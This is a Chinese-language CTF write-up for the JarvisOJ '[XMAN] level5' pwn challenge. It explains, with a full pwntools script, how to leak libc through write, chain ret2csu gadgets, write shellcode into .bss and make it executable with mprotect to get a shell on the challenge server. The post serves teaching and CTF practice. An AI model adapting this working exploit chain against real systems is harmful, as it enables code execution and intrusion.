---
title: XMAN level5 の Write-Up
date: 2020-06-23 17:11:53
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- XMAN
- ROP
- Stack
---
## Introduction

&emsp;&emsp;这是JarvisOJ的PWN题部分[XMAN]level5的Write-Up。题目和level3_x64一样，只是禁用system和execve函数，让我们尝试使用mmap和mprotect函数。关于这两个函数背景知识可以参考[Linux内存映射机制](https://coldwave96.github.io/2020/06/22/mmap/)。

<!-- more -->

## Analysis

&emsp;&emsp;总体思路很简单：

* 分配一块内存buf并设置(mmap)/修改(mprotect)这块内存属性为rwx

* 通过read函数将shellcode写到分配的buf中去

* 控制程序跳转到分配的buf中执行shellcode

&emsp;&emsp;如果通过mmap函数实现：

* 通过内存地址泄露获取libc加载基址

* 加上offset获得mmap函数在内存中真实地址

* 调用mmap函数设定buf长度和属性

* 将shellcode写入mmap函数返回的buf首地址

* 控制程序跳转到buf执行shellcode

&emsp;&emsp;如果通过mprotect函数实现：

* 通过内存地址泄露获取libc加载基址

* 加上offset获得mprotect函数在内存中真实地址

* 调用mprotect函数修改bss段的权限为rwx即7

* 将shellcode写入bss段

* 控制程序跳转到bss段执行shellcode

## PWN

&emsp;&emsp;这里简单点选择mprotect函数实现，因为mmap函数需要设置6个参数，而mprotect函数以及过程中会用到的read/write函数都只需要设置3个参数。

&emsp;&emsp;由于是64位程序，所以需要通过寄存器传参。在程序中找了一下，发现只有万能Gadgets可以用。关于万能Gadgets，可以看一下我之前的[ret2csu - 万能Gadgets](https://coldwave96.github.io/2020/06/15/Useful-Gadgets/)。

&emsp;&emsp;下面直接给出EXP脚本：

```Python
* # coding:utf-8
* from pwn import *
* context(arch='amd64',os='linux')
* 
* sh = remote('pwn2.jarvisoj.com', 9884)
* 
* elf = ELF('./level5')
* libc = ELF('./libc-2.19.so')
* 
* write_plt = elf.plt['write']
* write_got = elf.got['write']
* vuln_addr = elf.symbols['vulnerable_function']
* 
* gadget1 = 0x4006aa
* gadget2 = 0x400690
* 
* # 泄露write函数地址
* payload1 = 'a' * (0x80 + 0x8) + p64(gadget1)
* payload1 += p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) # 依次给rbx、rbp、r12、rdx、rsi、rdi赋值
* payload1 += p64(gadget2)
* payload1 += 'a' * 56 # padding
* payload1 += p64(vuln_addr)
* 
* sh.recvuntil('Input:\n')
* sh.sendline(payload1)
* write_addr = u64(sh.recv(8))
* 
* write_libc = libc.symbols['write']
* mprotect_libc = libc.symbols['mprotect']
* 
* bss_addr = 0x600a88
* read_plt = elf.plt['read']
* read_got = elf.got['read']
* 
* # mprotect函数在内存中的真实地址
* mprotect_addr = write_addr - write_libc + mprotect_libc
* 
* # 创建shellcode
* shellcode = p64(mprotect_addr) + asm(shellcraft.amd64.sh())
* 
* # 调用read函数将shellcode写入bss段
* payload2 = 'a' * (0x80 + 0x8) + p64(gadget1)
* payload2 += p64(0) + p64(1) + p64(read_got) + p64(len(shellcode)) + p64(bss_addr) + p64(0)
* payload2 += p64(gadget2)
* payload2 += 'a' * 56
* payload2 += p64(vuln_addr)
* 
* sh.recvuntil('Input:\n')
* sh.sendline(payload2)
* sh.send(shellcode)
* 
* # 调用mprotect函数修改bss段权限，并控制程序跳转到bss段执行shellcode
* payload3 = 'a' * (0x80 + 0x8) + p64(gadget1)
* payload3 += p64(0) + p64(1) + p64(bss_addr) # 跳转到bss端开始去执行mprotect函数
* payload3 += p64(7) + p64(0x1000) + p64(0x600000) # mprotect函数的3个参数
* payload3 += p64(gadget2)
* payload3 += 'a' * 56
* payload3 += p64(bss_addr + 8)
* 
* sh.recvuntil('Input:\n')
* sh.sendline(payload3)
* 
* sh.interactive()
* sh.close()
```

&emsp;&emsp;EXP运行结果：

![](/img/XMAN-level5/XMAN1.png)

## PS

&emsp;&emsp;关于mprotect函数的参数，第一个参数addr是内存页的首地址，内存是要求是以页为单位访问。一页是４kb也就是0x1000字节所以mprotect的第一个参数必须是0x1000的倍数，并且又要包含bss段，所以设置为0x600000。第二个参数是要设置的权限的地址的范围，也是页大小为单位，又需要能包含bss段，故而设置为最小单位0x1000。第三个参数就是具体属性，这里设置成RWX即7。